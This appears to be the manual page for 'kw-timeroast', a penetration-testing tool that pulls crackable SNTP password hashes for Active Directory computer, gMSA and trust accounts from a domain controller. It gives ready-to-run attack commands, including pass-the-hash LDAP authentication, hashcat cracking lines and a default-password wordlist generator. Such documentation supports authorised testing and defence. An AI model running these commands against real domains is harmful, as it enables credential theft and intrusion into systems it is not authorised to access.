# kw-timeroast

Timeroasting: extract SNTP password hashes for computer, gMSA, and trust accounts via the MS-SNTP protocol.

Sends NTP authentication requests to a domain controller and extracts crackable hashes keyed with the account's NT hash. The DC computes and returns a hash for any valid computer or gMSA RID without requiring credentials. Which accounts respond, the two packet formats and what they look like on the wire are on the [Timeroasting](../background/timeroasting.md) page. Credentials for LDAP and the LDAP filter are described on [Common options](common-options.md).

## Examples

```bash
# Basic scan with defaults (68-byte MD5, current password, RIDs 500-10000)
kw-timeroast 10.0.0.1

# Custom RID range
kw-timeroast 10.0.0.1 -r 500-2000

# LDAP mode — discover accounts and timeroast them
kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -p 'Password1!'

# LDAP with Kerberos auth
kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -k -c admin.ccache

# LDAP with pass-the-hash
kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -H :aabbccdd...

# LDAP + wordlist for cracking default passwords
kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -p pass --wordlist crack.txt

# Both formats and both passwords (3 packets per RID: two 68-byte, one 120-byte)
kw-timeroast 10.0.0.1 --format both --password both -o hashes.txt

# Account names in output
kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -p pass --rid-prefix -o named.txt

# Crack the MD5 hashes
hashcat -m 31300 hashes-current-md5.txt wordlist.txt

# Crack a file written with --rid-prefix
hashcat -m 31300 --username named-current-md5.txt wordlist.txt
```

## Help

```
$ kw-timeroast -h
usage: kw-timeroast [-h] [--version] [-v] [-r RANGE] [-R FILE]
                    [--format {auth,extended,both}]
                    [--password {current,previous,both}] [--ldap] [--ldap-ssl]
                    [-d DOMAIN] [-u USER] [-p PASS] [-H HASH] [-k] [-c FILE]
                    [--dc-hostname HOST] [-a N] [-t SEC] [--src-port PORT]
                    [--port PORT] [-o FILE] [--rid-prefix] [--wordlist FILE]
                    dc

Timeroasting: extract SNTP password hashes for computer, gMSA, and trust accounts.

positional arguments:
  dc                    Domain controller IP or hostname

options:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  -v, --verbose         Increase verbosity (-v, -vv)

attack:
  -r RANGE, --rids RANGE
                        RID range (default: 500-10000). Supports: 1, 1-100,
                        1-, -100, -, 1-100,500-600
  -R FILE, --rids-file FILE
                        File with RIDs, one per line (same range syntax per
                        line)
  --format {auth,extended,both}
                        Packet format: auth=68-byte MD5 (default),
                        extended=120-byte KDF+HMAC-SHA512, both=send both per
                        RID
  --password {current,previous,both}
                        Which password the 68-byte request asks for: current
                        (default), previous, or both. The 120-byte request
                        always asks for the previous one

ldap:
  --ldap                Query LDAP for machine and trust accounts (requires
                        auth)
  --ldap-ssl            Use LDAPS (port 636)
  -d DOMAIN, --domain DOMAIN
                        AD domain (e.g. corp.local)
  -u USER, --user USER  Username for LDAP auth
  -p PASS, --ldap-password PASS
                        Password for LDAP auth
  -H HASH, --hashes HASH
                        NT hash for LDAP auth (LM:NT, :NT, or NT)
  -k, --kerberos        Use Kerberos auth for LDAP
  -c FILE, --ccache FILE
                        Kerberos ccache file
  --dc-hostname HOST    DC FQDN (for Kerberos SPN, auto-detected if omitted)

network:
  -a N, --rate N        Queries per second (default: 180)
  -t SEC, --timeout SEC
                        Give up after SEC seconds of silence (default: 24)
  --src-port PORT       Source UDP port (default: dynamic). Set to 123 for
                        strict firewalls.
  --port PORT           Destination UDP port (default: 123)

output:
  -o FILE, --output FILE
                        Write hashes to file (splits by hash type and password
                        age)
  --rid-prefix          Prepend account name (or RID) to each output line
  --wordlist FILE       Write cracking wordlist (lowercase names, with and
                        without 14-char truncation)

Examples:
  kw-timeroast 10.0.0.1
  kw-timeroast 10.0.0.1 -r 500-2000 -o hashes.txt
  kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -p pass
  kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -k -c admin.ccache
  kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -H :aabb... --wordlist crack.txt
  kw-timeroast 10.0.0.1 --format both --password both -o hashes.txt
  kw-timeroast 10.0.0.1 --rid-prefix
```

## Behaviour

- **No authentication needed** for blind RID scanning. LDAP mode requires credentials.
- **Where the RIDs come from.** `--ldap` takes priority over `-r`/`-R`: when `--ldap` is set, RIDs and account names both come from LDAP, and `-d` is required. When `--ldap` is not set, `-R` provides the RIDs if given, otherwise `-r`, otherwise the default range 500-10000.
- **RID ranges.** `-r` accepts `1`, `1-100`, `1-`, `-100`, `-` and `1-100,500-600`. An open-ended range (`1-`, `-`) runs to RID 2147483647; in practice the scan ends when the DC has been silent for `--timeout` seconds. A `-R` file holds one range per line in the same syntax. A `#` starts a comment that runs to the end of the line, and blank lines are skipped. A line that is not a range stops the run with the file name and line number.
- **Requests per RID.** `--format` and `--password` together decide how many requests each RID gets. Bit 31 of the Key Identifier selects the password in the 68-byte request. The 120-byte request can only ask for the previous password, because the DC answers no other form, so it is sent once per RID whatever `--password` is set to, and its hashes are labelled previous. An account with no previous password, which is every machine account, answers with its current one ([Password selection](../background/timeroasting.md#password-selection)).

    | `--format` | `--password` | Requests per RID | Files written by `-o hashes.txt` |
    |---|---|---|---|
    | `auth` (default) | `current` (default) | 1 | `hashes-current-md5.txt` |
    | `auth` | `previous` | 1 | `hashes-previous-md5.txt` |
    | `auth` | `both` | 2 | `hashes-current-md5.txt`, `hashes-previous-md5.txt` |
    | `extended` | any | 1 | `hashes-previous-sha512.txt` |
    | `both` | `current` | 2 | `hashes-current-md5.txt`, `hashes-previous-sha512.txt` |
    | `both` | `previous` | 2 | `hashes-previous-md5.txt`, `hashes-previous-sha512.txt` |
    | `both` | `both` | 3 | All three |

- **IPv4 only.** NTP requests are sent over an IPv4 UDP socket.
- **Verbosity.** `-v` for info, `-vv` for debug.

## Output

When using `-o hashes.txt`, output is split by hash type and password age into up to 3 files:

| File | Contents |
|------|----------|
| `hashes-current-md5.txt` | 68-byte current password hashes |
| `hashes-previous-md5.txt` | 68-byte previous password hashes |
| `hashes-previous-sha512.txt` | 120-byte hashes, which are always the answer for the previous password |

"Previous" names what was asked for. An account with no previous password answers with its current one, so for machine accounts the previous files hold current-password hashes; only a trust account has both.

Only files with at least one hash are created. An existing file is never overwritten: `_1`, `_2` and so on is appended to the name instead. If `-o` has no extension, `.txt` is used.

**Account names.** The RID is not part of a `$sntp-ms$` hash string, and without `--rid-prefix` it appears only in the log on stderr. With `--rid-prefix`, each line is written as `<name-or-RID>:$sntp-ms$...` for account mapping; the name is used in LDAP mode and the RID otherwise. hashcat reads such a file with `--username`. The two line shapes themselves are under [Hash lines](../background/timeroasting.md#hash-lines).

**Wordlist.** `--wordlist` generates a cracking wordlist for default machine account passwords and requires `--ldap`. For each discovered account, it outputs:

- Lowercase sAMAccountName without `$` (full length)
- Same truncated to 14 characters (the pre-Windows 2000 default password limit)

Entries are deduplicated (names <= 14 chars only appear once).
